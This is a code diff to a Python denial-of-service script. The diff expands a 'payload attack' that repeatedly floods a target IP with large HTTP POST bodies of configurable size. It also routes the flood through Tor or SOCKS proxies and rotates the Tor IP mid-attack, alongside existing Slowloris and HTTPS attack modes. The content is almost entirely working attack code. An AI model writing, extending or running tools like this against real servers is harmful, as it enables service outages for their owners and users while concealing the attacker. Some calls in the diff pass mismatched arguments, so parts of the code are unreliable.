@@ -6,8 +6,11 @@ import random
 import time
 import socks
 import ssl
+import string
+
 from stem import Signal
 from stem.control import Controller
+
 
 
 from colorama import Fore, Back, Style
@@ -59,7 +62,7 @@ banner = f"""{fore_colors['yellow']}{styles['bright']}
 
 help = f"""
 {banner}
-Options:                        What it do:
+Options:                            What it do:
 
   -h, --help                    Show this help menu
   --ip <IP>                     Target IP
@@ -67,17 +70,24 @@ Options:                        What it do:
   -ths, --threads <N>           Number of threads (default: 100)
   -num-socks -n-socks           Number of Socks   (default: 1000)
   -ra, --random-agent           Random User-Agent
-  -slowa, --slowloris-attack    Perform Slowloris attack
-  -payloada, --payload-attack   Send a JSON file to server
 
-  \Mode (slowloris only)
-  //--proxy-ip <IP>               Use proxy IP
-  //--proxy-port <PORT>           Use proxy Port
+  \Mode Payload (Can use with tor&proxy)
+  //-payloada, --payload-attack     Send a JSON file to server
+  //--set-size-payload -set-p       Set Size of payload (default: 51200:50KB)
+  //--set-msg-payload               Set message of payload
+  //--random-payload                Randomized payload (Number)
+ 
+  \Mode Slowloris (Can use with tor&proxy)
+  //-slowa, --slowloris-attack    Perform Slowloris attack
 
+  \Mode Tor & Proxy (U can use with Slowloris and Payload Mode)
+    \TOR
   //--tor-ip                      Use TOR IP
   //--tor-port                    Use TOR Port
   //--change-tor-ip -c-tor-ip     Change Tor ip when Attacking
-
+    \Proxy
+  //--proxy-ip <IP>               Use proxy IP
+  //--proxy-port <PORT>           Use proxy Port
     """
 
 def clear_terminal():
@@ -110,7 +120,12 @@ parser.add_argument("-ths", "--threads", type=int, default=100, help="Number of 
 parser.add_argument("--num-socks", "-n-socks", type=int, required=False, default=1000, help="Number of Socks to use (default: 1000)")
 parser.add_argument("-ra", "--random-agent", action='store_true', required=False, help="Random User agent")
 parser.add_argument("-slowa", "--slowloris-attack", action='store_true', required=False, help="Slowloris Attack")
+
+# Send Payload
 parser.add_argument("-payloada", "--payload-attack", required=False, action='store_true' ,help="Send a json file to server")
+parser.add_argument("--set-size-payload", "-set-p", required=False, type=int, default=51200, help="Custom Size of payload (Default: 51200:50KB)")
+parser.add_argument("--set-msg-payload", required=False, type=str, help="Set message payload")
+parser.add_argument("--random-payload", required=False, action='store_true', help="Randomized payload")
 
 # Proxy
 parser.add_argument("--proxy-ip", required=False, help="Use proxy (ip)")
@@ -130,7 +145,13 @@ port_target = args.port
 num_thread = args.threads
 num_sockets = args.num_socks
 random_user_agent = args.random_agent
+
+# Payload
 payload_req = args.payload_attack
+custom_payload = args.set_size_payload
+msg_of_payload = args.set_msg_payload
+random_payload = args.random_payload
+
 
 # Proxy
 proxy_ip = args.proxy_ip
@@ -346,29 +367,61 @@ def slowloris_attack_normal():
         time.sleep(10)
 # Normal SLOWRIS-ATTACK _END_
 
-def send_payload():
+# Payload Attack _START_
+if args.random_payload:
+    size_of_payload = ''.join(random.choices(string.ascii_letters + string.digits, k=args.set_size_payload))
+elif args.set_msg_payload:
+    size_of_payload = args.set_msg_payload * args.set_size_payload
+else:
+    size_of_payload = "A" * args.set_size_payload  # 50 KBbig_payload = "A" * 51200  # 50 KB
+
+def send_payload(use_tor=False, proxy_ip=None, proxy_port=None):
     while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target_ip, port_target))
+        try:
+            if use_tor:
+                s = socks.socksocket()
+                s.set_proxy(socks.SOCKS5, tor_ip, tor_port, rdns=True)
+            elif proxy_ip and proxy_port:
+                s = socks.socksocket()
+                s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
+            else:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-        if args.random_agent:
+            s.settimeout(5)
+            s.connect((target_ip, port_target))
+
+            if args.random_agent:
                 user_agent = random.choice(user_agents)
-        else:
-            user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64)"
+            else:
+                user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64)"
 
+            req = (
+                f"POST / HTTP/1.1\r\n"
+                f"Host: {target_ip}\r\n"
+                f"User-Agent: {user_agent}\r\n"
+                f"Content-Length: {len(size_of_payload)}\r\n"
+                f"Connection: keep-alive\r\n\r\n"
+                f"{size_of_payload}"
+            )
+            s.sendall(req.encode())
+            s.close()
+            print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Sended Payload{styles['reset']}")
+            time.sleep(0.1)
 
-        big_payload = "A" * 500000  # 500 KB
-        req = (
-            f"POST / HTTP/1.1\r\n"
-            f"Host: {target_ip}\r\n"
-            f"User-Agent: {user_agent}\r\n"
-            f"Content-Length: {len(big_payload)}\r\n"
-            f"Connection: keep-alive\r\n\r\n"
-            f"{big_payload}"
-        )
-        s.sendall(req.encode())
-        s.close()
-        time.sleep(0.1)
+        except socket.timeout:
+            print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Timeout while sending payload{styles['reset']}")
+            try:
+                s.close()
+            except:
+                pass
+            time.sleep(1)
+        except Exception as e:
+            print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Error sending payload: {e}")
+            try:
+                s.close()
+            except:
+                pass
+            time.sleep(1)
 
 def https_attack():
     try:
@@ -377,7 +430,6 @@ def https_attack():
         raw_sock.settimeout(3)
         raw_sock.connect((target_ip, port_target))
 
-        # ห่อด้วย SSL เพื่อให้คุยกับ HTTPS ได้
         context = ssl.create_default_context()
         s = context.wrap_socket(raw_sock, server_hostname=target_ip)
 
@@ -449,24 +501,33 @@ if check_target(target_ip, port_target):
 
         # Payload Attack
         elif args.payload_attack:
-            # are_u_sure = input("Are u sure, it will make ur pc lag(y/n): ")
-            # if are_u_sure in Y_ANSWER:
-            #     print("Ok....")
-            #     time.sleep(2)
-            # elif are_u_sure in N_ANSWER:
-            #     print("Ok...")
-            #     time.sleep(2)
-            #     exit()
-            # else:
-            #     print("WTF!")
-            #     exit()
+                
+            if args.proxy_ip and args.proxy_port:
+                send_payload(proxyip=args.proxy_ip, proxy_p=args.proxy_port)
+            elif args.tor_ip and args.tor_port:
+                if check_tor_running():
+                    print(f"\n[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Tor is running and reachable{styles['reset']}")
+                    time.sleep(3)
+                    send_payload(use_tor=True)
+                    if args.change_tor_ip:
+                        time.sleep(5)
+                        change_tor_ip()
+                        print(f"\n{styles['bright']}** Changeing Tor IP it will take ({back_colors['cyan']}10s/per 1 IP{back_colors['reset']}) **{styles['reset']}")
+                        time.sleep(10)
+                else:
+                    print(f"\n[{back_colors['red']}!{back_colors['reset']}] Please start {styles['bright']}Tor{styles['reset']} before running this script: tor")
+                    time.sleep(3)
+
+                    exit()
+            else:
+                send_payload()
+            
             t = threading.Thread(target=send_payload, daemon=True)
 
         # Https Attak
         elif args.port == 443:
             t = threading.Thread(target=https_attack, daemon=True)
-
-        # 
+ 
         else:
             t = threading.Thread(target=main_attack, daemon=True)
         t.start()
@@ -475,5 +536,3 @@ if check_target(target_ip, port_target):
 
 else:
     print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Target not reachable. Aborting.{styles['reset']}")
-
-# กัน script หลุด
